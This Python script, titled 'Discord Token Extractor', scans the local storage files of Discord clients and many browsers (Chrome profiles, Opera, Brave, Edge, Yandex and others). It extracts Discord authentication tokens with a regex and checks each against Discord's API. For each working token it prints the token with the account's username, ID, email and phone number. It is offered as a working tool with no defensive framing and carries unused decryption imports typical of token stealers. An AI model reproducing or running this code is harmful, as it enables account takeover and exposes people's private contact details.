import os
import re
import requests
from datetime import datetime, timezone
import ctypes
import json
import sys
import colorama
from Crypto.Cipher import AES
import base64
from win32crypt import CryptUnprotectData

colorama.init()

color = colorama.Fore
green = color.GREEN
white = color.WHITE
reset = color.RESET

INFO = f'{green}[{white}!{green}] |'
WAIT = f'{green}[{white}~{green}] |'

def Title(title):
    if sys.platform.startswith("win"):
        ctypes.windll.kernel32.SetConsoleTitleW(f"| {title}")
    elif sys.platform.startswith("linux"):
        sys.stdout.write(f"\x1b]2;| {title}\x07")

def Continue():
    input(f"{green}{INFO} Press Enter to continue -> {reset}")

class ExtractTokens:
    def __init__(self):
        self.tokens = []
        self.extract()

    def extract(self):
        paths = {
            'Discord': os.getenv("APPDATA") + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': os.getenv("APPDATA") + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': os.getenv("APPDATA") + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': os.getenv("APPDATA") + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': os.getenv("APPDATA") + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': os.getenv("LOCALAPPDATA") + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': os.getenv("LOCALAPPDATA") + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': os.getenv("LOCALAPPDATA") + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': os.getenv("LOCALAPPDATA") + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': os.getenv("LOCALAPPDATA") + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': os.getenv("LOCALAPPDATA") + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': os.getenv("LOCALAPPDATA") + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': os.getenv("LOCALAPPDATA") + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': os.getenv("LOCALAPPDATA") + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': os.getenv("LOCALAPPDATA") + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': os.getenv("LOCALAPPDATA") + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': os.getenv("LOCALAPPDATA") + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue

            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue

                try:
                    with open(f'{path}\\{file_name}', 'r', errors='ignore') as f:
                        lines = f.readlines()
                    
                    for line in [x.strip() for x in lines if x.strip()]:
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,110}", line):
                            if token not in self.tokens and self.validate_token(token):
                                self.tokens.append(token)
                except Exception as e:
                    print(f"[!] Error reading {file_name} at {path}: {e}")

    def validate_token(self, token):
        try:
            headers = {'Authorization': token}
            response = requests.get("https://discord.com/api/v8/users/@me", headers=headers, timeout=5)
            return response.status_code == 200
        except Exception as e:
            print(f"[!] Error validating token: {e}")
            return False

    def get_tokens(self):
        return self.tokens

class GetYourToken:
    def __init__(self):
        self.upload_tokens()

    def upload_tokens(self):
        tokens = ExtractTokens().tokens

        number = 0
        if not tokens:
            print(f"{INFO} No tokens found.")
            return

        for token in tokens:
            user = self.get_user_info(token)
            if not user:
                continue

            number += 1
            print(f"""{green}
Token n°{number}:
{white}[{green}+{white}] Token       : {token}
{white}[{green}+{white}] Username    : {user['username']}#{user['discriminator']}
{white}[{green}+{white}] User ID     : {user['id']}
{white}[{green}+{white}] Email       : {user['email']}
{white}[{green}+{white}] Phone       : {user['phone']}
{white}[{green}+{white}] Created At  : {user['created_at']}""")

    def get_user_info(self, token):
        try:
            headers = {'Authorization': token}
            r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)

            if r.status_code == 200:
                user_info = r.json()
                user_info['created_at'] = self.convert_timestamp(user_info['id'])
                return user_info
        except Exception as e:
            print(f"{WAIT} Failed to fetch user information for token: {e}")

        return None

    def convert_timestamp(self, snowflake):
        created_at = int((int(snowflake) >> 22) + 1420070400000) / 1000
        return datetime.fromtimestamp(created_at, timezone.utc).strftime('%Y-%m-%d %H:%M:%S')

if __name__ == "__main__":
    Title("Discord Token Extractor")
    extractor = GetYourToken()
    Continue()
